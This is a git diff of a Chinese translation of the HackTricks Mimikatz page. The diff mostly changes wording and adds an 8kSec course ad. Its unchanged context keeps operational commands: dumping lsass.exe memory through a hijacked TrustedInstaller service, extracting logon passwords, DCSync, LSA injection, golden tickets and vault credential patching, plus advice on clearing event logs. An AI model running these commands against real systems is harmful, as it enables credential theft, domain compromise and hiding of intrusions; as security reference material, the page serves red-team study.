@@ -1,19 +1,26 @@
 # Mimikatz
 
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** 上关注我们。**
 * **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
+
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+通过 8kSec 学院深化您在 **移动安全** 方面的专业知识。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
+
+{% embed url="https://academy.8ksec.io/" %}
+
 
 **本页面基于 [adsecurity.org](https://adsecurity.org/?page\_id=1821) 的内容**。查看原文以获取更多信息！
 
@@ -36,7 +43,7 @@
 sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
 sc start TrustedInstaller
 ```
-这允许将 `lsass.exe` 的内存转储到文件中，然后可以在另一个系统上进行分析以提取凭据：
+这允许将 `lsass.exe` 的内存转储到一个文件中，然后可以在另一个系统上进行分析以提取凭据：
 ```
 # privilege::debug
 # sekurlsa::minidump lsass.dmp
@@ -49,7 +56,7 @@ sc start TrustedInstaller
 #### 清除事件日志
 
 - **命令**：此操作旨在删除事件日志，使追踪恶意活动变得更加困难。
-- Mimikatz 在其标准文档中并未提供直接通过命令行清除事件日志的命令。然而，事件日志操作通常涉及使用系统工具或脚本在 Mimikatz 之外清除特定日志（例如，使用 PowerShell 或 Windows 事件查看器）。
+- Mimikatz 在其标准文档中没有提供直接通过命令行清除事件日志的命令。然而，事件日志操作通常涉及使用系统工具或脚本在 Mimikatz 之外清除特定日志（例如，使用 PowerShell 或 Windows 事件查看器）。
 
 #### 实验性功能：修补事件服务
 
@@ -124,7 +131,7 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **清除票证**：
 - 命令：`kerberos::purge`
 - 清除会话中的所有 Kerberos 票证。
-- 在使用票证操作命令之前非常有用，以避免冲突。
+- 在使用票证操作命令之前很有用，以避免冲突。
 
 ### Active Directory 篡改
 
@@ -134,9 +141,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **DCSync**：模拟 DC 请求密码数据。
 - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`
 
-### 凭据访问
+### 凭证访问
 
-- **LSADUMP::LSA**：从 LSA 中提取凭据。
+- **LSADUMP::LSA**：从 LSA 中提取凭证。
 - `mimikatz "lsadump::lsa /inject" exit`
 
 - **LSADUMP::NetSync**：使用计算机帐户的密码数据模拟 DC。
@@ -167,9 +174,9 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - **PRIVILEGE::Debug**：获取调试权限。
 - `mimikatz "privilege::debug" exit`
 
-### 凭据转储
+### 凭证转储
 
-- **SEKURLSA::LogonPasswords**：显示已登录用户的凭据。
+- **SEKURLSA::LogonPasswords**：显示已登录用户的凭证。
 - `mimikatz "sekurlsa::logonpasswords" exit`
 
 - **SEKURLSA::Tickets**：从内存中提取 Kerberos 票证。
@@ -198,17 +205,23 @@ mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123
 - `mimikatz "vault::cred /patch" exit`
 
 
+<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+深入了解 **移动安全**，请访问 8kSec 学院。通过我们的自学课程掌握 iOS 和 Android 安全并获得认证：
+
+{% embed url="https://academy.8ksec.io/" %}
+
 {% hint style="success" %}
-学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-学习与实践 GCP 黑客技术： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术： <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>支持 HackTricks</summary>
 
 * 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
-* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 分享黑客技巧。
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
 
 </details>
 {% endhint %}
